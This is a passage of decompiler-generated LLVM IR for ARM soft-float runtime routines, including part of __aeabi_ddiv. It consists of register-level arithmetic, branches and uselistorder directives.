  %v4_1ab58 = zext i1 %v3_1ab50 to i32
  %v5_1ab58 = add i32 %v4_1ab58, %v3_1ab58
  %v9_1ab58 = icmp ule i32 %v5_1ab58, %v5_1ab44
  %v10_1ab58 = icmp ult i32 %v3_1ab58, %v5_1ab44
  %v11_1ab58 = select i1 %v3_1ab50, i1 %v9_1ab58, i1 %v10_1ab58
  %v2_1ab5c = zext i1 %v11_1ab58 to i32
  %v3_1ab5c = add i32 %v2_1ab5c, %v3_1ab4c
  %v2_1ab60 = load i32, i32* %stack_var_-40, align 4
  store i32 %v9_1aa90, i32* %r8.global-to-local, align 4
  store i32 %v12_1aa90, i32* %sb.global-to-local, align 4
  %v0_1ab64 = load i32, i32* %ip.global-to-local, align 4
  %v2_1ab64 = icmp eq i32 %v0_1ab64, 0
  br i1 %v2_1ab64, label %bb45, label %bb44

bb44:                                             ; preds = %dec_label_pc_1aa8c
  %v2_1ab68 = or i32 %v2_1ab50, 1
  store i32 %v2_1ab68, i32* %lr.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1aa8c, %bb44
  %v0_1ab7c = phi i32 [ %v2_1ab50, %dec_label_pc_1aa8c ], [ %v2_1ab68, %bb44 ]
  %v0_1ab6c = load i32, i32* %r4.global-to-local, align 4
  %v1_1ab6c = add i32 %v0_1ab6c, -255
  %v2_1ab70 = icmp ugt i32 %v3_1ab5c, 511
  %v2_1ab74 = icmp eq i1 %v2_1ab70, false
  %v5_1ab74 = sext i1 %v2_1ab74 to i32
  %v3_1ab74 = add nsw i32 %v5_1ab74, -1023
  %v6_1ab74 = add i32 %v3_1ab74, %v0_1ab6c
  store i32 %v6_1ab74, i32* %r4.global-to-local, align 4
  %v3_1ab78 = icmp ugt i32 %v1_1ab6c, 768
  br i1 %v3_1ab78, label %dec_label_pc_1ab88, label %dec_label_pc_1ab7c

dec_label_pc_1ab7c:                               ; preds = %bb45
  %v1_1ab7c = icmp slt i32 %v0_1ab7c, 0
  %v2_1ab7c = mul i32 %v0_1ab7c, 2
  store i32 %v2_1ab7c, i32* %lr.global-to-local, align 4
  %v3_1ab80 = mul i32 %v5_1ab58, 2
  %v4_1ab80 = zext i1 %v1_1ab7c to i32
  %v5_1ab80 = or i32 %v4_1ab80, %v3_1ab80
  %v9_1ab80 = icmp ule i32 %v5_1ab80, %v5_1ab58
  %v10_1ab80 = icmp ult i32 %v3_1ab80, %v5_1ab58
  %v11_1ab80 = select i1 %v1_1ab7c, i1 %v9_1ab80, i1 %v10_1ab80
  %v3_1ab84 = mul i32 %v3_1ab5c, 2
  %v4_1ab84 = zext i1 %v11_1ab80 to i32
  %v5_1ab84 = or i32 %v4_1ab84, %v3_1ab84
  br label %dec_label_pc_1ab88

dec_label_pc_1ab88:                               ; preds = %bb45, %dec_label_pc_1ab7c
  %v0_1ab98 = phi i32 [ %v0_1ab7c, %bb45 ], [ %v2_1ab7c, %dec_label_pc_1ab7c ]
  %v0_1ab90 = phi i32 [ %v5_1ab58, %bb45 ], [ %v5_1ab80, %dec_label_pc_1ab7c ]
  %v1_1ab88 = phi i32 [ %v3_1ab5c, %bb45 ], [ %v5_1ab84, %dec_label_pc_1ab7c ]
  %v4_1ab88 = mul i32 %v1_1ab88, 2048
  %v4_1ab8c = udiv i32 %v0_1ab90, 2097152
  %v5_1ab88 = or i32 %v4_1ab8c, %v2_1ab60
  %v5_1ab8c = or i32 %v5_1ab88, %v4_1ab88
  store i32 %v5_1ab8c, i32* %r0.global-to-local, align 4
  %v3_1ab90 = mul i32 %v0_1ab90, 2048
  %v4_1ab94 = udiv i32 %v0_1ab98, 2097152
  %v5_1ab94 = or i32 %v3_1ab90, %v4_1ab94
  store i32 %v5_1ab94, i32* %r1.global-to-local, align 4
  %v3_1ab98 = mul i32 %v0_1ab98, 2048
  store i32 %v3_1ab98, i32* %lr.global-to-local, align 4
  %v1_1ab9c = add i32 %v6_1ab74, -253
  store i32 %v1_1ab9c, i32* %ip.global-to-local, align 4
  %v2_1ab9c = icmp ugt i32 %v6_1ab74, 252
  %v7_1ab9c = icmp eq i32 %v6_1ab74, 253
  %v2_1aba0 = xor i1 %v7_1ab9c, true
  %v3_1aba0 = and i1 %v2_1ab9c, %v2_1aba0
  br i1 %v3_1aba0, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1ab88
  %v6_1aba0 = icmp ugt i32 %v1_1ab9c, 1791
  %v11_1aba0 = icmp eq i32 %v1_1ab9c, 1792
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1ab88, %bb46
  %v1_1aba4 = phi i1 [ %v7_1ab9c, %dec_label_pc_1ab88 ], [ %v11_1aba0, %bb46 ]
  %v0_1aba4 = phi i1 [ %v2_1ab9c, %dec_label_pc_1ab88 ], [ %v6_1aba0, %bb46 ]
  %v2_1aba4 = xor i1 %v1_1aba4, true
  %v3_1aba4 = and i1 %v0_1aba4, %v2_1aba4
  call void @__pseudo_cond_branch(i1 %v3_1aba4, i32 ptrtoint (i32* @global_var_1abe8.1400 to i32))
  %v0_1aba8 = load i32, i32* %lr.global-to-local, align 4
  %v2_1aba8 = icmp slt i32 %v0_1aba8, 0
  %v6_1aba8 = icmp eq i32 %v0_1aba8, -2147483648
  %v1_1abac = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_1aba8, label %bb48, label %._crit_edge

bb48:                                             ; preds = %bb47
  %v2_1abac = urem i32 %v1_1abac, 2
  %v3_1abac = icmp ne i32 %v2_1abac, 0
  %v4_1abac = udiv i32 %v1_1abac, 2
  store i32 %v4_1abac, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb47, %bb48
  %v1_1abb0 = phi i1 [ %v3_1abac, %bb48 ], [ %v2_1aba8, %bb47 ]
  %v2_1abb0 = zext i1 %v1_1abb0 to i32
  %v3_1abb0 = add i32 %v2_1abb0, %v1_1abac
  store i32 %v3_1abb0, i32* %r1.global-to-local, align 4
  %v0_1abb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1abb4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1abb4 = and i32 %v1_1abb4, 4096
  %v3_1abb4 = icmp ne i32 %v2_1abb4, 0
  %v4_1abb4 = mul i32 %v1_1abb4, 1048576
  %v6_1abb4 = add i32 %v4_1abb4, %v0_1abb4
  %v7_1abb4 = zext i1 %v3_1abb4 to i32
  %v8_1abb4 = add i32 %v7_1abb4, %v6_1abb4
  store i32 %v8_1abb4, i32* %r0.global-to-local, align 4
  %v2_1abb8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1abb8, i32* %r4.global-to-local, align 4
  ret i32 %v8_1abb4

dec_label_pc_1abbc:                               ; preds = %.thread, %bb43
  %v1_1abbc22 = phi i32 [ %v1_1abbc19, %.thread ], [ %v1_1abbc, %bb43 ]
  %v1_1aa8421 = phi i32 [ %v1_1aa8418, %.thread ], [ %v1_1aa84, %bb43 ]
  %v1_1aa8020 = phi i32 [ %v1_1aa8017, %.thread ], [ %v1_1aa80, %bb43 ]
  %v2_1abc0 = or i32 %v1_1aa8020, %v1_1abbc22
  %v2_1abc4 = or i32 %arg4, %arg2
  store i32 %v2_1abc4, i32* %r1.global-to-local, align 4
  %v2_1abc8 = xor i32 %v2_1abc0, %v1_1aa8421
  store i32 %v2_1abc8, i32* %r0.global-to-local, align 4
  %v4_1abcc = udiv i32 %v1_1aa70, 2
  %v5_1abcc = sub i32 %v2_1aa68, %v4_1abcc
  store i32 %v5_1abcc, i32* %r4.global-to-local, align 4
  %v7_1abcc = sub i32 0, %v5_1abcc
  %v8_1abcc = and i32 %v2_1aa68, %v7_1abcc
  %v11_1abcc = icmp eq i32 %v2_1aa68, %v4_1abcc
  %v7_1abd0 = icmp sgt i32 %v2_1aa68, %v4_1abcc
  br i1 %v7_1abd0, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_1abbc
  %v10_1abd0 = sub i32 %v1_1aa70, %v5_1abcc
  %v12_1abd0 = xor i32 %v5_1abcc, %v1_1aa70
  %v13_1abd0 = xor i32 %v10_1abd0, %v1_1aa70
  %v14_1abd0 = and i32 %v13_1abd0, %v12_1abd0
  %v17_1abd0 = icmp eq i32 %v1_1aa70, %v5_1abcc
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_1abbc, %bb49
  %v2_1abd8.in = phi i32 [ %v8_1abcc, %dec_label_pc_1abbc ], [ %v14_1abd0, %bb49 ]
  %v1_1abd8.in = phi i32 [ %v5_1abcc, %dec_label_pc_1abbc ], [ %v10_1abd0, %bb49 ]
  %v0_1abd8 = phi i1 [ %v11_1abcc, %dec_label_pc_1abbc ], [ %v17_1abd0, %bb49 ]
  %v1_1abd8 = icmp slt i32 %v1_1abd8.in, 0
  %v2_1abd8 = icmp slt i32 %v2_1abd8.in, 0
  %v3_1abd4 = xor i1 %v2_1abd8, %v1_1abd8
  %v4_1abd4 = or i1 %v0_1abd8, %v3_1abd4
  br i1 %v4_1abd4, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v9_1abd428 = mul i32 %v5_1abcc, 1048576
  %v10_1abd429 = or i32 %v2_1abc8, %v9_1abd428
  store i32 %v10_1abd429, i32* %r0.global-to-local, align 4
  %v7_1abd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1abd8, i32* %r4.global-to-local, align 4
  ret i32 %v10_1abd429

bb52:                                             ; preds = %bb50
  %v1_1abdc = or i32 %v2_1abc8, 1048576
  store i32 %v1_1abdc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_1abe4 = add i32 %v5_1abcc, -1
  store i32 %v1_1abe4, i32* %r4.global-to-local, align 4
  ret i32 %v1_1abdc

; uselistorder directives
  uselistorder i32 %v5_1abcc, { 4, 1, 0, 6, 3, 5, 2, 7 }
  uselistorder i32 %v4_1abcc, { 2, 1, 0 }
  uselistorder i32 %v2_1abc8, { 1, 0, 2 }
  uselistorder i32 %v1_1abac, { 2, 0, 1 }
  uselistorder i32 %v0_1aba8, { 1, 0 }
  uselistorder i1 %v7_1ab9c, { 1, 0 }
  uselistorder i32 %v2_1ab7c, { 1, 0 }
  uselistorder i1 %v1_1ab7c, { 1, 0 }
  uselistorder i32 %v6_1ab74, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1ab7c, { 1, 0, 2 }
  uselistorder i32 %v3_1ab5c, { 1, 0, 2 }
  uselistorder i32 %v5_1ab58, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v3_1ab58, { 1, 0 }
  uselistorder i1 %v3_1ab50, { 1, 0 }
  uselistorder i32 %v5_1ab44, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1ab44, { 1, 0 }
  uselistorder i1 %v3_1ab3c, { 1, 0 }
  uselistorder i32 %v2_1ab3c, { 1, 0, 2 }
  uselistorder i32 %v5_1ab30, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1ab30, { 1, 0 }
  uselistorder i1 %v3_1ab28, { 1, 0 }
  uselistorder i32 %v2_1ab28, { 1, 0, 2 }
  uselistorder i32 %v5_1ab1c, { 2, 1, 0 }
  uselistorder i32 %v2_1ab18, { 1, 2, 0 }
  uselistorder i32 %v2_1ab08, { 0, 2, 1 }
  uselistorder i32 %v5_1ab00, { 1, 0 }
  uselistorder i32 %v2_1aafc, { 1, 2, 0 }
  uselistorder i32 %v2_1aaf0, { 1, 0, 2 }
  uselistorder i32 %v2_1aae4, { 1, 0, 2 }
  uselistorder i32 %v2_1aad4, { 1, 0, 2 }
  uselistorder i32 %v2_1aac8, { 0, 2, 1 }
  uselistorder i32 %v2_1aab8, { 1, 0, 2 }
  uselistorder i32 %v6_1aab0, { 1, 0, 2, 3 }
  uselistorder i32 %v6_1aaac, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_1aaa4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1aaa0, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v3_1aa9c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v3_1aa98, { 3, 2, 0, 1 }
  uselistorder i32 %v3_1aa94, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_1aa84, { 1, 0, 2 }
  uselistorder i32 %v1_1aa80, { 1, 0, 2 }
  uselistorder i32 %v6_1aa74, { 0, 2, 1, 3 }
  uselistorder i32 %v6_1aa70, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1aa70, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1aa6c, { 1, 0 }
  uselistorder i32 %v2_1aa68, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v6_1aa58, { 2, 1, 0 }
  uselistorder i32 %v5_1aa54, { 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 1, 10, 0 }
  uselistorder i32 32768, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 13, 1, 12 }
  uselistorder i32 65536, { 2, 0, 3, 82, 4, 83, 1, 5, 6, 7, 8, 84, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 30, 26, 31, 27, 32, 28, 33, 29, 34, 35, 36, 40, 37, 41, 38, 42, 39, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 76, 74, 77, 79, 80, 78, 81, 85 }
  uselistorder i32* @sb, { 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 3, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 1, 2, 6, 7, 8, 9, 10, 11, 0, 12 }
  uselistorder i32* @r8, { 23, 33, 34, 35, 36, 37, 38, 39, 8, 9, 10, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 1, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 0, 79, 80, 3, 81, 82, 83, 2, 84, 85, 86, 87, 24, 32, 95, 97, 96, 11, 12, 88, 89, 90, 91, 92, 93, 94, 4, 25, 26, 27, 28, 29, 30, 31, 6, 7, 5, 19, 20, 21, 22, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 %arg4, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 3, 1, 4 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1abbc, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1ab88, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @function_1abe8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1abe8:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_1abe8 = load i1, i1* @cpsr_z, align 1
  %v1_1abe8 = load i1, i1* @cpsr_n, align 1
  %v2_1abe8 = load i1, i1* @cpsr_v, align 1
  %v3_1abe8 = xor i1 %v1_1abe8, %v2_1abe8
  %v4_1abe8 = or i1 %v0_1abe8, %v3_1abe8
  br i1 %v4_1abe8, label %dec_label_pc_1abec, label %dec_label_pc_1ad50

dec_label_pc_1abec:                               ; preds = %dec_label_pc_1abe8
  %v0_1abec = load i32, i32* @r4, align 4
  %v4_1abec = add i32 %v0_1abec, 54
  %v6_1abec = sub i32 0, %v0_1abec
  %v7_1abec = and i32 %v4_1abec, %v6_1abec
  %v8_1abec = icmp slt i32 %v7_1abec, 0
  store i1 %v8_1abec, i1* @cpsr_v, align 1
  %v9_1abec = icmp slt i32 %v4_1abec, 0
  store i1 %v9_1abec, i1* @cpsr_n, align 1
  %v10_1abec = icmp eq i32 %v4_1abec, 0
  store i1 %v10_1abec, i1* @cpsr_z, align 1
  %v7_1abf0 = icmp sgt i32 %v0_1abec, -54
  br i1 %v7_1abf0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1abec
  store i32 0, i32* @r1, align 4
  %v8_1abf4 = load i32, i32* %r0.global-to-local, align 4
  %v9_1abf4 = and i32 %v8_1abf4, -2147483648
  store i32 %v9_1abf4, i32* %r0.global-to-local, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v9_1abf4

bb6:                                              ; preds = %dec_label_pc_1abec
  %v1_1abfc = sub i32 0, %v0_1abec
  %v2_1ac00 = sub i32 -32, %v0_1abec
  %v4_1ac00 = add i32 %v0_1abec, 31
  %v5_1ac00 = and i32 %v4_1ac00, %v1_1abfc
  %v6_1ac00 = icmp slt i32 %v5_1ac00, 0
  store i1 %v6_1ac00, i1* @cpsr_v, align 1
  %v6_1ac04 = icmp slt i32 %v1_1abfc, 32
  br i1 %v6_1ac04, label %dec_label_pc_1ac08, label %dec_label_pc_1ac6c

dec_label_pc_1ac08:                               ; preds = %bb6
  %v1_1ac08 = add i32 %v2_1ac00, 12
  %v8_1ac0c = icmp sgt i32 %v1_1ac08, 0
  br i1 %v8_1ac0c, label %dec_label_pc_1ac40, label %dec_label_pc_1ac10

dec_label_pc_1ac10:                               ; preds = %dec_label_pc_1ac08
  %v1_1ac10 = add i32 %v2_1ac00, 32
  %v1_1ac14 = sub i32 0, %v2_1ac00
  %v0_1ac18 = load i32, i32* @r1, align 4
  %v6_1ac18 = shl i32 %v0_1ac18, %v1_1ac14
  %v2_1ac1c = add i32 %v2_1ac00, 31
  %v3_1ac1c = shl i32 1, %v2_1ac1c
  %v6_1ac1c = lshr i32 %v0_1ac18, %v1_1ac10
  %v1_1ac20 = load i32, i32* %r0.global-to-local, align 4
  %v7_1ac20 = shl i32 %v1_1ac20, %v1_1ac14
  %v8_1ac20 = or i32 %v7_1ac20, %v6_1ac1c
  %v1_1ac24 = and i32 %v1_1ac20, -2147483648
  %tmp = bitcast i32 %v1_1ac20 to float
  %tmp13 = call float @fabsf(float %tmp)
  %v1_1ac28 = bitcast float %tmp13 to i32
  %tmp14 = icmp slt i32 %v6_1ac18, 0
  %v4_1ac2c = zext i1 %tmp14 to i32
  %v5_1ac2c = add i32 %v8_1ac20, %v4_1ac2c
  store i32 %v5_1ac2c, i32* @r1, align 4
  %v5_1ac30 = and i32 %v1_1ac28, %v3_1ac1c
  %v6_1ac30 = icmp ne i32 %v5_1ac30, 0
  %v7_1ac30 = lshr i32 %v1_1ac28, %v1_1ac10
  %v9_1ac30 = add i32 %v7_1ac30, %v1_1ac24
  %v10_1ac30 = zext i1 %v6_1ac30 to i32
  %v11_1ac30 = add i32 %v9_1ac30, %v10_1ac30
  store i32 %v11_1ac30, i32* %r0.global-to-local, align 4
  %v19_1ac30 = add i32 %v11_1ac30, %v10_1ac30
  %v20_1ac30 = xor i32 %v19_1ac30, %v1_1ac20
  %v21_1ac30 = xor i32 %v19_1ac30, %v7_1ac30
  %v22_1ac30 = and i32 %v20_1ac30, %v21_1ac30
  %v23_1ac30 = icmp slt i32 %v22_1ac30, 0
  store i1 %v23_1ac30, i1* @cpsr_v, align 1
  %v0_1ac34 = load i32, i32* @lr, align 4
  %v3_1ac34 = mul i32 %v6_1ac18, 2
  %v4_1ac34 = or i32 %v0_1ac34, %v3_1ac34
  %v5_1ac34 = icmp slt i32 %v4_1ac34, 0
  store i1 %v5_1ac34, i1* @cpsr_n, align 1
  %v6_1ac34 = icmp eq i32 %v4_1ac34, 0
  store i1 %v6_1ac34, i1* @cpsr_z, align 1
  br i1 %v6_1ac34, label %bb7, label %bb8

bb7:                                              ; preds = %dec_label_pc_1ac10
  %tmp15 = sext i1 %tmp14 to i32
  %v6_1ac38 = add nsw i32 %tmp15, -1
  %v7_1ac38 = and i32 %v5_1ac2c, %v6_1ac38
  store i32 %v7_1ac38, i32* @r1, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_1ac10, %bb7
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v11_1ac30

dec_label_pc_1ac40:                               ; preds = %dec_label_pc_1ac08
  %v1_1ac40 = sub i32 0, %v2_1ac00
  %v1_1ac44 = add i32 %v2_1ac00, 32
  %v0_1ac48 = load i32, i32* @r1, align 4
  %v6_1ac48 = shl i32 %v0_1ac48, %v1_1ac40
  %v6_1ac4c = lshr i32 %v0_1ac48, %v1_1ac44
  %v1_1ac50 = load i32, i32* %r0.global-to-local, align 4
  %v7_1ac50 = shl i32 %v1_1ac50, %v1_1ac40
  %v8_1ac50 = or i32 %v7_1ac50, %v6_1ac4c
  %v1_1ac54 = and i32 %v1_1ac50, -2147483648
  %tmp16 = icmp slt i32 %v6_1ac48, 0
  %v4_1ac58 = zext i1 %tmp16 to i32
  %v5_1ac58 = add i32 %v8_1ac50, %v4_1ac58
  store i32 %v5_1ac58, i32* @r1, align 4
  %v6_1ac58 = icmp ult i32 %v5_1ac58, %v8_1ac50
  %v2_1ac5c = zext i1 %v6_1ac58 to i32
  %v3_1ac5c = or i32 %v2_1ac5c, %v1_1ac54
  store i32 %v3_1ac5c, i32* %r0.global-to-local, align 4
  %v9_1ac5c = add nsw i32 %v3_1ac5c, %v2_1ac5c
  %v10_1ac5c = sub i32 0, %v1_1ac50
  %v11_1ac5c = and i32 %v9_1ac5c, %v10_1ac5c
  %v12_1ac5c = icmp slt i32 %v11_1ac5c, 0
  store i1 %v12_1ac5c, i1* @cpsr_v, align 1
  %v0_1ac60 = load i32, i32* @lr, align 4
  %v3_1ac60 = mul i32 %v6_1ac48, 2
  %v4_1ac60 = or i32 %v0_1ac60, %v3_1ac60
  %v5_1ac60 = icmp slt i32 %v4_1ac60, 0
  store i1 %v5_1ac60, i1* @cpsr_n, align 1
  %v6_1ac60 = icmp eq i32 %v4_1ac60, 0
  store i1 %v6_1ac60, i1* @cpsr_z, align 1
  br i1 %v6_1ac60, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_1ac40
  %tmp17 = sext i1 %tmp16 to i32
  %v6_1ac64 = add nsw i32 %tmp17, -1
  %v7_1ac64 = and i32 %v5_1ac58, %v6_1ac64
  store i32 %v7_1ac64, i32* @r1, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_1ac40, %bb9
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v3_1ac5c

dec_label_pc_1ac6c:                               ; preds = %bb6
  %v1_1ac6c = sub i32 32, %v2_1ac00
  %v0_1ac70 = load i32, i32* @lr, align 4
  %v1_1ac70 = load i32, i32* @r1, align 4
  %v7_1ac70 = shl i32 %v1_1ac70, %v1_1ac6c
  %v8_1ac70 = or i32 %v7_1ac70, %v0_1ac70
  %v6_1ac74 = lshr i32 %v1_1ac70, %v2_1ac00
  %v1_1ac78 = load i32, i32* %r0.global-to-local, align 4
  %v7_1ac78 = shl i32 %v1_1ac78, %v1_1ac6c
  %v8_1ac78 = or i32 %v7_1ac78, %v6_1ac74
  %v6_1ac7c = lshr i32 %v1_1ac78, %v2_1ac00
  %v1_1ac80 = and i32 %v1_1ac78, -2147483648
  store i32 %v1_1ac80, i32* %r0.global-to-local, align 4
  %v7_1ac84 = lshr i32 %v1_1ac80, %v2_1ac00
  %v8_1ac84 = sub i32 -1, %v7_1ac84
  %v9_1ac84 = and i32 %v6_1ac7c, %v8_1ac84
  %tmp18 = icmp slt i32 %v8_1ac78, 0
  %v4_1ac88 = zext i1 %tmp18 to i32
  %v5_1ac88 = add i32 %v4_1ac88, %v9_1ac84
  store i32 %v5_1ac88, i32* @r1, align 4
  %v3_1ac8c = mul i32 %v8_1ac78, 2
  %v4_1ac8c = or i32 %v8_1ac70, %v3_1ac8c
  %v5_1ac8c = icmp slt i32 %v4_1ac8c, 0
  store i1 %v5_1ac8c, i1* @cpsr_n, align 1
  %v6_1ac8c = icmp eq i32 %v4_1ac8c, 0
  store i1 %v6_1ac8c, i1* @cpsr_z, align 1
  br i1 %v6_1ac8c, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_1ac6c
  %tmp19 = sext i1 %tmp18 to i32
  %v6_1ac90 = add nsw i32 %tmp19, -1
  %v7_1ac90 = and i32 %v5_1ac88, %v6_1ac90
  store i32 %v7_1ac90, i32* @r1, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_1ac6c, %bb11
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_1ac80

dec_label_pc_1ad50:                               ; preds = %dec_label_pc_1abe8
  %v0_1ad50 = load i32, i32* %r0.global-to-local, align 4
  %v1_1ad50 = and i32 %v0_1ad50, -2147483648
  %v1_1ad58 = or i32 %v1_1ad50, 2146435072
  store i32 %v1_1ad58, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_1ad58

; uselistorder directives
  uselistorder i32 %v3_1ac5c, { 2, 0, 1 }
  uselistorder i32 %v8_1ac50, { 1, 0 }
  uselistorder i32 %v1_1ac40, { 1, 0 }
  uselistorder i32 %v11_1ac30, { 1, 0, 2 }
  uselistorder i32 %v1_1ac20, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1ac14, { 1, 0 }
  uselistorder i32 %v2_1ac00, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1abfc, { 1, 0 }
  uselistorder i32 %v4_1abec, { 1, 2, 0 }
  uselistorder i32 %v0_1abec, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %tmp4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp2, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 7, 1, 8, 2, 9, 3, 10, 4, 5 }
  uselistorder i32 12, { 32, 33, 9, 10, 48, 49, 50, 0, 51, 5, 52, 16, 53, 54, 11, 3, 55, 12, 7, 67, 68, 69, 70, 71, 72, 8, 73, 74, 75, 76, 77, 78, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 47, 45, 13, 17, 26, 30, 18, 19, 58, 59, 60, 1, 56, 6, 57, 2, 61, 14, 62, 63, 64, 65, 79, 4, 46, 20, 21, 22, 23, 24, 25, 27, 28, 15, 29, 31, 66 }
  uselistorder i32 -32, { 2, 1, 3, 4, 5, 6, 10, 7, 11, 12, 8, 0, 9 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_1ad64(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1ad64:
  %v1_1ad68 = or i32 %arg1, 2146959360
  ret i32 %v1_1ad68
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1ad70 = load i32, i32* @r4, align 4
  store i32 %v3_1ad70, i32* %stack_var_-16, align 4
  %v6_1ad70 = load i32, i32* @r5, align 4
  %v9_1ad70 = load i32, i32* @r6, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1ad7c = load i32, i32* %r0.global-to-local, align 4
  %v4_1ad7c = udiv i32 %v1_1ad7c, 1048576
  %v5_1ad7c = urem i32 %v4_1ad7c, 2048
  store i32 %v5_1ad7c, i32* @r4, align 4
  %v6_1ad7c = icmp eq i32 %v5_1ad7c, 0
  br i1 %v6_1ad7c, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre150 = udiv i32 %arg3, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1ad80 = udiv i32 %arg3, 1048576
  %v6_1ad80 = urem i32 %v5_1ad80, 2048
  store i32 %v6_1ad80, i32* %r5.global-to-local, align 4
  %v7_1ad80 = icmp eq i32 %v6_1ad80, 0
  br i1 %v7_1ad80, label %.thread1, label %bb92

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1af04

bb92:                                             ; preds = %bb
  %v5_1ad84 = icmp eq i32 %v5_1ad7c, 2047
  br i1 %v5_1ad84, label %.thread2, label %bb93

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb92
